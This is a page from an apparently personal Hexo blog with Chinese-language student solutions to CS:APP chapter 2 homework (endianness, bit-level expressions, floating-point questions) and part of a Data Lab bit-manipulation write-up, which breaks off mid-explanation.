<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-SA22011137-杨明珠-作业1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/30/SA22011137-%E6%9D%A8%E6%98%8E%E7%8F%A0-%E4%BD%9C%E4%B8%9A1/" class="article-date">
  <time class="dt-published" datetime="2022-10-30T05:22:09.963Z" itemprop="datePublished">2022-10-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="计算机系统作业1"><a href="#计算机系统作业1" class="headerlink" title="计算机系统作业1"></a>计算机系统作业1</h1><h2 id="2-58"><a href="#2-58" class="headerlink" title="2.58"></a>2.58</h2><p>编写过程is_little_endian, 当在小端法机器上编译和运行时返回1, 在大端法机器上编译运行时则返回0 。这个程序应该可以运行在任何机器上，无论机器的字长是多少。</p>
<p><strong>解：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> *byte_pointer; <span class="comment">// 定义一个字节指针</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">is_little_endian</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">0xff</span>;                          <span class="comment">// 存储在内存中为 0x00 0x00 0x00 0xff</span></span><br><span class="line">    byte_pointer start = (byte_pointer)&amp;num; <span class="comment">// 强制转换为四个字节数组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (start[<span class="number">0</span>] == <span class="number">0xff</span>) <span class="comment">// 小端模式读取的第一个字节为0xff</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 大端模式读取的第一个字节为0x00</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, is_little_endian());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-61"><a href="#2-61" class="headerlink" title="2.61"></a>2.61</h2><p>写一个C 表达式，在下列描述的条件下产生1, 而在其他情况下得到0 。假设x是int类型。</p>
<p>A. x的任何位都等于1 。</p>
<p>B. x的任何位都等于0 。</p>
<p>C. x的最低有效字节中的位都等于1 。</p>
<p>D. x的最高有效字节中的位都等于0 。</p>
<p>代码应该遵循位级整数编码规则，另外还有一个限制，你不能使用相等（&#x3D;&#x3D;）和不相等（!&#x3D;）测试。</p>
<p><strong>解：</strong></p>
<p>A.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!~x</span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!x</span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!((~x)&amp;<span class="number">0xff</span>)  或</span><br><span class="line">!~(x|~<span class="number">0xff</span>)</span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!((x &gt;&gt; ((<span class="keyword">sizeof</span>(<span class="type">int</span>)<span class="number">-1</span>) &lt;&lt; <span class="number">3</span>)) &amp; <span class="number">0xff</span>)</span><br></pre></td></tr></table></figure>

<h2 id="2-77"><a href="#2-77" class="headerlink" title="2.77"></a>2.77</h2><p>假设我们有一个任务：生成一段代码，将整数变量x 乘以不同的常数因子K 。为了提高效率，我们想只使用 + 、- 和&lt;&lt;运算。对于下列K的值，写出执行乘法运算的C表达式，每个表达式中最多使用3个运算。<br>A. K&#x3D;17<br>B. K&#x3D;-7<br>C. K&#x3D;60<br>D. K&#x3D;-112</p>
<p><strong>解：</strong></p>
<p>A.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(x&lt;&lt;<span class="number">4</span>)+x</span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-(x&lt;&lt;<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(x&lt;&lt;<span class="number">6</span>)-(x&lt;&lt;<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(x&lt;&lt;<span class="number">4</span>)-(x&lt;&lt;<span class="number">7</span>)</span><br></pre></td></tr></table></figure>

<h2 id="2-84"><a href="#2-84" class="headerlink" title="2.84"></a>2.84</h2><p>填写下列程序的返回值，这个程序测试它的第一个参数是否小于或者等于第二个参数。假定函数f2u 返回一个无符号32 位数字，其位表示与它的浮点参数相同。你可以假设两个参数都不是NaN 。两种0, +0 和-0 被认为是相等的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">float_le</span><span class="params">(<span class="type">float</span> x, <span class="type">float</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> ux = f2u(x);</span><br><span class="line">    <span class="type">unsigned</span> uy = f2u(y);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*Get the sign bits*/</span> </span><br><span class="line">    <span class="type">unsigned</span> sx = ux &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="type">unsigned</span> sy = uy &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="comment">/*Give an expression using only ux, uy, sx, and sy*/</span></span><br><span class="line">    <span class="keyword">return</span>   ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">f2u</span><span class="params">(<span class="type">float</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> *)&amp;x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">float_le：测试它的第一个参数是否小于或者等于第二个参数 x&lt;=y 则 true </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">float_le</span><span class="params">(<span class="type">float</span> x, <span class="type">float</span> y)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//将浮点数按照无符号数解释（位不变）</span></span><br><span class="line">    <span class="type">unsigned</span> ux = f2u(x);</span><br><span class="line">    <span class="type">unsigned</span> uy = f2u(y);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得符号位 0或1</span></span><br><span class="line">    <span class="type">unsigned</span> sx = ux &gt;&gt; <span class="number">31</span>; </span><br><span class="line">    <span class="type">unsigned</span> sy = uy &gt;&gt; <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 四种x&lt;=y的情况返回true</span></span><br><span class="line">    <span class="keyword">return</span> (ux &lt;&lt; <span class="number">1</span> == <span class="number">0</span> &amp;&amp; uy &lt;&lt; <span class="number">1</span> == <span class="number">0</span>) || <span class="comment">// 1. +0或者-0都为0(左移一位去除符号位对0影响)</span></span><br><span class="line">           (sx &amp;&amp; !sy) ||                    <span class="comment">// 2. x为负（符号位sx为1），y为正（符号位sy为0）</span></span><br><span class="line">           (!sx &amp;&amp; !sy &amp;&amp; ux &lt;= uy) ||       <span class="comment">// 3. x,y都为正时，x&lt;=y等价于ux&lt;=uy</span></span><br><span class="line">           (sx &amp;&amp; sy &amp;&amp; ux &gt;= uy);           <span class="comment">// 4. x,y都为负时，x&lt;=y等价于ux&gt;=uy</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-89"><a href="#2-89" class="headerlink" title="2.89"></a>2.89</h2><p>我们在一个int 类型为32 位补码表示的机器上运行程序。float类型的值使用32 位IEEE 格式，而double 类型的值使用64 位IEEE 格式。我们产生随机整数x 、y 和z, 并且把它们转换成double 类型的值：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*Create some arbitrary values*/</span></span><br><span class="line"><span class="type">int</span> x = random();</span><br><span class="line"><span class="type">int</span> y = random();</span><br><span class="line"><span class="type">int</span> z = random();</span><br><span class="line"><span class="comment">/*Convert to double*/</span></span><br><span class="line"><span class="type">double</span> dx = (<span class="type">double</span>)x;</span><br><span class="line"><span class="type">double</span> dy = (<span class="type">double</span>)y;</span><br><span class="line"><span class="type">double</span> dz = (<span class="type">double</span>)z;</span><br></pre></td></tr></table></figure>

<p>对于下列的每个C 表达式，你要指出表达式是否总是为1 。如果它总是为1, 描述其中的数学原理。否则，列举出使它为0的参数的例子。请注意，不能使用IA32 机器运行GCC 来测试你的答案，因为对于float 和double, 它使用的都是80 位的扩展精度表示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A. (<span class="type">float</span>)x==(<span class="type">float</span>)dx</span><br><span class="line">B. dx-dy==(<span class="type">double</span>)(x-y)</span><br><span class="line">C. (dx+dy)+dz==dx+(dy+dz)</span><br><span class="line">D. (dx*dy)*dz==dx*(dy*dz)</span><br><span class="line">E. dx/dx==dz/dz</span><br></pre></td></tr></table></figure>

<p><strong>解：</strong></p>
<p>A. 真。int类型转成double类型不会损失精度，此时，x 和 dx 转成float类型虽然可能会损失精度，但是在舍入原则相同的情况下得到的结果相同。</p>
<p>B. 假。当x-y得到的结果溢出时，转成double类型的结果与真实结果不同，如y&#x3D;INT_MIN时。</p>
<p>C. 真。两个int类型转成double类型后，相加得到的结果仍然在double类型可表示范围内，且不会因为舍入丢失精度，所以是可以结合的。</p>
<p>D. 假。两个int类型转成double类型后，相乘得到的结果不一定在double类型可表示范围内，可能会发生溢出或者由于舍入导致失去精度，所以不具有结合性。</p>
<p>E. 假。当dx !&#x3D; 0 且 dz &#x3D;&#x3D; 0时，左边结果为1，右边结果为无穷大，不相等。</p>
<h2 id="2-91"><a href="#2-91" class="headerlink" title="2.91"></a>2.91</h2><p>大约公元前250 年，希腊数学家阿基米德证明了$ \frac{223}{71}&lt;\pi&lt;\frac{22}{7} $。如果当时有一台计算机和标准库&lt;math.h&gt;, 他就能够确定$\pi$的单精度浮点近似值的十六进制表示为 0x40490FDB 。当然，所有的这些都只是近似值，因为$\pi$不是有理数。<br>A. 这个浮点值表示的二进制小数是多少？<br>B. $ \frac{22}{7}$的二进制小数表示是什么？提示：参见家庭作业2. 83 。<br>C. 这两个$\pi$的近似值从哪一位（相对于二进制小数点）开始不同的？</p>
<p><strong>解：</strong></p>
<p>A.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">十六进制：</span><br><span class="line">    <span class="number">0x40490FDB</span></span><br><span class="line">二进制：</span><br><span class="line">    <span class="number">0100</span> <span class="number">0000</span> <span class="number">0100</span> <span class="number">1001</span> <span class="number">0000</span> <span class="number">1111</span> <span class="number">1101</span> <span class="number">1011</span></span><br><span class="line">浮点格式：</span><br><span class="line">    <span class="number">0</span> <span class="number">10000000</span> <span class="number">10010010000111111011011</span>    </span><br><span class="line">    s:<span class="number">0</span> e=<span class="number">2</span>^<span class="number">7</span>=<span class="number">128</span> E=<span class="number">128</span><span class="number">-127</span>=<span class="number">1</span> f=<span class="number">0.10010010000111111011011</span> M=<span class="number">1.10010010000111111011011</span></span><br><span class="line">二进制小数：</span><br><span class="line">    <span class="number">11.0010010000111111011011</span></span><br></pre></td></tr></table></figure>

<p>B. $ \frac{22}{7}&#x3D;3+\frac{1}{7}$</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Y=<span class="number">1</span>，<span class="number">2</span>^k<span class="number">-1</span>=<span class="number">7</span>,k=<span class="number">3</span>,y=<span class="number">001</span></span><br><span class="line">二进制小数：<span class="number">11.001001001</span>...(y=<span class="number">001</span>)</span><br></pre></td></tr></table></figure>

<p>C. 从小数点后第9位开始不同。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/30/SA22011137-%E6%9D%A8%E6%98%8E%E7%8F%A0-%E4%BD%9C%E4%B8%9A1/" data-id="cl9uxk0060000gwom7sw3fo2m" data-title="" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-SA22011137-杨明珠-实验1&amp;2&amp;3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/30/SA22011137-%E6%9D%A8%E6%98%8E%E7%8F%A0-%E5%AE%9E%E9%AA%8C1&2&3/" class="article-date">
  <time class="dt-published" datetime="2022-10-30T05:22:09.960Z" itemprop="datePublished">2022-10-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="计算机系统实验1-amp-2-amp-3"><a href="#计算机系统实验1-amp-2-amp-3" class="headerlink" title="计算机系统实验1&amp;2&amp;3"></a>计算机系统实验1&amp;2&amp;3</h1><h2 id="实验1：位操作（Data-Lab）"><a href="#实验1：位操作（Data-Lab）" class="headerlink" title="实验1：位操作（Data Lab）"></a>实验1：位操作（Data Lab）</h2><h3 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h3><p>本实验考察计算机信息的表示，要求实现简单的位操作、逻辑运算、二进制补码和浮点函数，并且限制了可使用的 C 操作符和数量，有助于理解 C 数据类型的位级表示以及数据操作的位级行为。本实验总共包括位操作的15个编程题。</p>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><table>
<thead>
<tr>
<th>CPU</th>
<th>Intel(R) Xeon(R) Silver 4110 CPU @ 2.10GHz</th>
</tr>
</thead>
<tbody><tr>
<td>操作系统</td>
<td>Ubuntu 20.04.3   (64位)</td>
</tr>
<tr>
<td>C&#x2F;C++编译器</td>
<td>gcc version 9.4.0</td>
</tr>
</tbody></table>
<h3 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h3><p>“bits.c”文件中包含需要实现的15个函数，文件中规定了实现每个函数需要的逻辑和算术操作符（规定数量）。</p>
<ul>
<li>只能使用规定的操作符 <code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code></li>
<li>不能使用循环或者条件语句</li>
<li>不能使用超过8位的常数 <code>0xff</code></li>
</ul>
<h3 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h3><h4 id="1-bitXor"><a href="#1-bitXor" class="headerlink" title="1. bitXor"></a>1. bitXor</h4><p>本题要求使用按位与<code>&amp;</code>和按位取反<code>~</code>实现按位异或。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp;</span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123; </span><br><span class="line">  <span class="keyword">return</span> ~(~x &amp; ~y) &amp; ~(x &amp; y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>异或就是当参与运算的两个二进制数不同时结果才为1，其他情况为0。</p>
<p>根据德摩根定律（参考离散数学集合论知识）：</p>
<p><img src="https://bkimg.cdn.bcebos.com/formula/c2f4430bd910acad95a9e1ea734ec185.svg" alt="img"></p>
<p>推导出：</p>
<img src="C:\Users\YMZ\AppData\Roaming\Typora\typora-user-images\image-20221014124724742.png" alt="image-20221014124724742" style="zoom:50%;" />

<p>转换为C代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x^y=~(~x&amp;~y)&amp;~(x&amp;y)</span><br></pre></td></tr></table></figure>

<h4 id="2-tmin"><a href="#2-tmin" class="headerlink" title="2. tmin"></a>2. tmin</h4><p>求int类型的最小值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>C 语言中 <code>int</code> 类型是32位，即4字节数 。<code>int</code> 类型的最小值，即最高位符号位为 1，其他位均为 0，所以只需要将 1 左移 31 位。</p>
<h4 id="3-isTmax"><a href="#3-isTmax" class="headerlink" title="3. isTmax"></a>3. isTmax</h4><p>判断输入值是否为 int 类型的最大值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isTmax</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> !((~(x+<span class="number">1</span>)^x))&amp;!!(x+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>考虑四位的最大值<code>x=0111</code> ，x+1之后就会变成<code>1000</code> ，对<code>1000</code> 取非 <code>0111</code> 就会重新变回x值，自己与自己异或会得到0，所以可以用异或来判断<code>~(x+1)</code>与<code>x</code>是否相等，从而判断是否为x最大值。</p>
<blockquote>
<p>小技巧：等号的操作可以直接利用<code>a == b</code> 等价于 <code>!(a ^b)</code></p>
</blockquote>
<p>这里有一个例外就是<code>x=-1</code> ，由于<code>-1=1111</code> 他利用上面的式子判断也符合，故要特判-1 利用<code>!!(x+1)</code> 这个操作-1和最大值并不相同。</p>
<h4 id="4-allOddBits"><a href="#4-allOddBits" class="headerlink" title="4. allOddBits"></a>4. allOddBits</h4><p>判断所有奇数位是否都为1，这里的奇数指的是位的阶级是2的几次幂。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> mask = <span class="number">0xAA</span> + (<span class="number">0xAA</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">  mask = mask + (mask &lt;&lt; <span class="number">16</span>); <span class="comment">// 迭代两次得到奇数位全1的掩码</span></span><br><span class="line">  <span class="keyword">return</span> !((mask &amp; x) ^ mask); <span class="comment">// 即判断 mask&amp;x == mask</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先要构造掩码，使用移位运算符构造出奇数位全1的数 <code>mask</code> ，然后获取输入 <code>x</code> 值的奇数位，其他位清零（<code>mask&amp;x</code>），然后与 <code>mask</code> 进行异或操作，若相同则最终结果为0，然后返回其值的逻辑非。</p>
<h4 id="5-negate"><a href="#5-negate" class="headerlink" title="5. negate"></a>5. negate</h4><p>不使用 <code>-</code> 操作符，求 <code>-x</code> 值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * negate - return -x</span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 补码等于反码加1</span></span><br><span class="line">  <span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>补码实际上是一个阿贝尔群，满足性质公式：<code>A + ~A = -1</code>和<code>A + neg A =0</code>，利用这两个式子我们可以得到 <code>neg A = ~A + 1</code>，对于 <code>x</code>，<code>-x</code> 是其补码，所以 <code>-x</code> 可以通过对 <code>x</code> 取反加1得到。</p>
<h4 id="6-isAsciiDigit"><a href="#6-isAsciiDigit" class="headerlink" title="6. isAsciiDigit"></a>6. isAsciiDigit</h4><p>计算输入值是否是数字 0-9 的 <code>ASCII</code> 值，即计算 <code>x</code> 是否在 0x30 ~ 0x39 范围内。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> !((x &amp; <span class="number">0xf0</span>) ^ <span class="number">0x30</span>) &amp; !(((x &amp; <span class="number">0x0f</span>) + <span class="number">6</span>) &gt;&gt; <span class="number">4</span>) &amp; !(x &amp; (~<span class="number">0xff</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分别对低位和高位字节进行判断：</p>
